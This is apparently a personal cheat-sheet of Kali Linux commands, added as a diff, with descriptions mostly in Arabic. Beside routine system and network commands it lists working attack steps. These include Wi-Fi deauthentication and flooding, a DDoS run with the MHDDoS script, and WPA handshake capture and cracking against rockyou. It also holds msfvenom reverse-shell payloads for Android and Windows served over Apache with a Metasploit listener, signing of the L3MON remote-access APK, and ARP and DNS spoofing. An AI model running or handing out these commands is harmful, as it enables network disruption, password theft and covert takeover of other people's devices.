@@ -1,0 +1,121 @@
+wlan.fc.type_subtype == 0x0c     :           wireshark filter to detect deauth attack
+tcp.flags.syn == 1 and tcp.flags.ack == 0   :     wireshark filter for detect ddos attack
+sudo macof -i wlan1 -d 90:e1:7b:3f:6d:b1 -n 25  : ddos attack
+airmon-ng check kill  :  ايقاف العمليات التي تعيق عمل كارت الواي فاي
+arp-scan -l  : اظهار اﻻجهزة المتصلة بالشبكة الداخلية
+brave-browser  : تشغيل متصفح brave
+
+sudo beef-xss : تشغيل اداة beef
+sudo /home/kali/Desktop/venv/bin/python3 start.py TCP 192.168.1.29:80 300 60  :   ddos attack by mhddos script
+ip addr : عرض معلومات الشبكة
+iw dev : عرض معلومات حول واجهات الواي فاي (Wireless interfaces)
+sudo openvpn --config '/home/kali/Downloads/nl-free-2.protonvpn.tcp.ovpn' : تشغيل اتصال VPN باستخدام OpenVPN
+airmon-ng check kill : إيقاف الخدمات التي تعيق عمل الشبكات
+sudo macof -i wlan1 -d 90:e1:7b:3f:6d:b1 -n 25 : هجوم flooding على الشبكة
+sudo mdk4 wlan0 d -b '/home/kali/Desktop/list' : تنفيذ هجوم black list
+sudo mdk4 wlan0 d -c 36 : قطع الشبكة على قناة معينة
+sudo mdk4 wlan0 d -w '/home/kali/Desktop/list'  :  لحماية هذه القائمة
+python3 -m pip install --upgrade pip : تحديث اداة pip
+airmon-ng start wlan0 11   :             نضيف رقم جنل الشبكة التي نريد استقبال الباكجات منها 
+airodump-ng -w rmag -c 11 --bssid CC:BE:59:91:D7:B0 wlan0mon  :  جمع الحزم باداة airodump-ng
+aireplay-ng -0 11 -a CC:BE:59:91:D7:B0 -c D0:D0:03:7A:D1:05 wlan0mon  : تنفيذ هجوم deauth بال aireplay-ng
+sudo gzip -d rockyou.txt.gz      cd       cp /usr/share/wordlists/rockyou.txt rockyou.txt     sudo grep -x '.\{8,63\}' rockyou.txt > wparockyou.txt  : الحصول على قائمة كلمات سر مناسبة لاختبارات WPA/WPA2 (التي تقبل كلمات سر من 8 إلى 63 حرفاً فقط) من ملف rockyou الشهير
+
+aircrack-ng hack-01.cap -w /user/share/wordlists/rockyou.txt : استخراج الباسورد من ملف معين 
+sudo /usr/share/hashcat-utils/cap2hccapx.bin shop-*.cap wpa2.hccapx :   تحويل ملفات التقاط حزم الشبكة اللاسلكية (.cap) إلى ملف واحد بصيغة hccapx مناسب لكسر كلمة المرور باستخدام hashcat
+locate wordlists | less :  تبحث عن كل الملفات أو المجلدات التي تحتوي على كلمة wordlists في مسارها
+python3 -m pip install -r requirements.txt : تنصيب المكتبات المتطلبة لتشغيل اداة معينة
+sudo apt --fix-broken install  :  ﻻصﻻح مشاكل تثبيت الحزم
+tar -xzvf   :    to extract tgz file
+tar -xf python.tar.xz   :   to extract tar.xz file
+cat readme.md   or  cat readme.txt :  لعرض محتوى الملفات النصية
+sudo netdiscover -i eth0 -P -r 10.0.2.0/24 :  لعرض اﻻجهزة المتصلة بالشبكة
+python3 dymerge.py /home/kali/Desktop/wordlist/wordlist-probable.txt /home/kali/Desktop/wordlist/rockyou.txt -s -u -o /home/kali/Desktop/allpasswors.txt : لدمج محتويات ملفين بملف واحد
+
+
+ifconfig wlan0 down : إيقاف كرت الشبكة
+ifconfig wlan0 up : تشغيل كرت الشبكة
+macchanger -r wlan0 : تغيير MAC address عشوائيًا
+macchanger -s wlan0 : عرض MAC address الحالي
+sudo rm -r hs : حذف مجلد hs بالكامل
+python3 -m pip install --upgrade pip : تحديث pip
+airmon-ng start wlan0 11 : تشغيل المراقبة على قناة رقم 11
+airodump-ng -w rmag -c 11 --bssid CC:BE:59:91:D7:B0 wlan0mon : مراقبة شبكة محددة
+aireplay-ng -0 11 -a CC:BE:59:91:D7:B0 -c D0:D0:03:7A:D1:05 wlan0mon : تنفيذ هجوم deauth
+sudo gzip -d rockyou.txt.gz : فك ضغط ملف rockyou
+cp /usr/share/wordlists/rockyou.txt rockyou.txt : نسخ ملف rockyou
+sudo grep -x '.\{8,63\}' rockyou.txt > wparockyou.txt : تصفية كلمات السر المناسبة للواي فاي
+aircrack-ng hack-01.cap -w /user/share/wordlists/rockyou.txt : كسر كلمة مرور الواي فاي
+sudo /usr/share/hashcat-utils/cap2hccapx.bin shop-*.cap wpa2.hccapx : تحويل cap إلى hccapx
+sudo hashcat -m 2500 -a 3 -o pass.txt /home/kali/Desktop/wpa2.hccapx /home/kali/Desktop/wparockyou.txt : تجربة كلمات سر على الواي فاي
+locate wordlists | less : استعراض مواقع ملفات wordlists
+sudo find / -iname "wordlist-probable.txt" : البحث عن ملف معين في النظام
+python3 -m pip install -r requirements.txt : تثبيت متطلبات المشروع
+pip3 install -r requirements.txt : تثبيت متطلبات المشروع باستخدام pip3
+python3 main.py akramesmael : تشغيل سكربت بايثون معين
+sudo netdiscover -i eth0 -P -r 10.0.2.0/24 : اكتشاف الأجهزة على الشبكة
+cat readme.md : عرض محتوى ملف
+tar -xzvf file.tgz : فك ضغط ملف tgz
+tar -xf python.tar.xz : فك ضغط ملف tar.xz
+sudo apt --fix-broken install : إصلاح التثبيتات التالفة
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.217 LPORT=5432 R > 11.apk : إنشاء بايلود اندرويد
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=8080 -f exe > s.exe : إنشاء بايلود ويندوز
+cp s.exe /var/www/html : نقل الملف إلى خادم الويب
+service apache2 start : بدء خدمة Apache
+msfconsole : تشغيل ميتاسبلويت
+use exploit/multi/handler : اختيار الاستغلال
+set PAYLOAD windows/meterpreter/reverse_tcp : إعداد البايلود
+set LHOST 10.0.2.15 : إعداد IP المحلي
+set LPORT 8080 : إعداد البورت
+show options : عرض الخيارات
+exploit : تنفيذ الهجوم
+strings 123.pcap : استخراج النصوص من ملف pcap
+man cryptcat : عرض معلومات حول أداة cryptcat
+md5sum file.txt : حساب قيمة MD5 للملف
+sudo ./reosploit.py --ip 192.168.1.0/24 --action scan : فحص شبكة باستخدام reosploit
+keytool -genkey -V -keystore /home/kali/Desktop/key.keystore -alias alexis -keyalg RSA -keysize 2048 -validity 1000 : إنشاء توقيع
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /home/kali/Desktop/key.keystore L3MON.apk alexis : توقيع تطبيق
+sudo rm -r ~/PATH/Evil-Droid-master/ : حذف أداة Evil-Droid
+sudo python3 -m http.server --bind 192.168.1.217 9000 : تشغيل خادم HTTP
+sudo apt install tor -y : تثبيت tor
+sudo apt install proxychains -y : تثبيت proxychains
+sudo service tor start : تشغيل tor
+nano /etc/proxychains.conf : تحرير إعدادات proxychains
+sudo service tor restart : إعادة تشغيل tor
+proxychains firefox : تصفح مخفي باستخدام proxychains
+net.probe on : تفعيل فحص الشبكة
+net.show : عرض معلومات الشبكة
+set arp.spoof.targets 192.168.1.192 : تحديد هدف spoof
+arp.spoof on : تفعيل spoof
+net.sniff on : بدء اعتراض الباكيجات
+net.sniff off : إيقاف الاعتراض
+set dns.spoof.domains myamazon.com : إعداد الدومين للتزوير
+dns.spoof on : تفعيل تزوير DNS
+sudo python3 -m venv venv : إنشاء بيئة افتراضية
+source venv/bin/activate : تفعيل البيئة الافتراضية
+pip install -r requirements.txt : تثبيت المتطلبات
+sudo nmap -sS -sV -O -p 1-1000 -T4 -oN scan.txt 192.168.0.0/24 : فحص الشبكة باستخدام nmap
+Is    : اظهار الملفات
+cd    : تغيير المسار
+pwd  : إظهار المسار الحالي 
+ifconfig  : عرض جميع بطاقات الشبكة النشطة ومعلوماتها مثل IP و MAC و MTU
+Show IP details : لإظهار تفاصيل عنوان الـ IP 
+nmap -sV target_ip : معلومات تفصيلية عن واجهات الشبكة اللاسلكية (Wi-Fi interfaces).
+recon-ng : مخصص لجمع المعلومات (OSINT) عن الأهداف
+John the Ripper : أداة  تُستخدم في كسر كلمات المرور
+john --wordlist=rockyou.txt hashfile : 
+sqlmap -u "target_website.com" --dbs : لاكتشاف واستغلال ثغرات SQL Injection في المواقع الإلكترونية
+htop : عرض العمليات الجارية بشكل تفاعلي
+df -h : عرض حالة استخدام الأقراص
+du -sh * : معرفة حجم المجلدات والملفات
+uptime : معرفة مدة تشغيل النظام
+whoami : عرض اسم المستخدم الحالي
+history : عرض سجل الأوامر المستخدمة
+uname -a : عرض معلومات عن نظام التشغيل
+journalctl -xe : عرض سجلات النظام
+chmod +x file.sh : إعطاء صلاحية التنفيذ لملف
+chown user:user file : تغيير ملكية ملف
+scp file user@host:/path : نسخ ملف إلى جهاز آخر عبر SSH
+rsync -avz source/ dest/ : مزامنة الملفات بين مجلدين
+ping -c 4 8.8.8.8 : اختبار الاتصال بالإنترنت
+traceroute google.com : تتبع مسار الاتصال إلى موقع معين
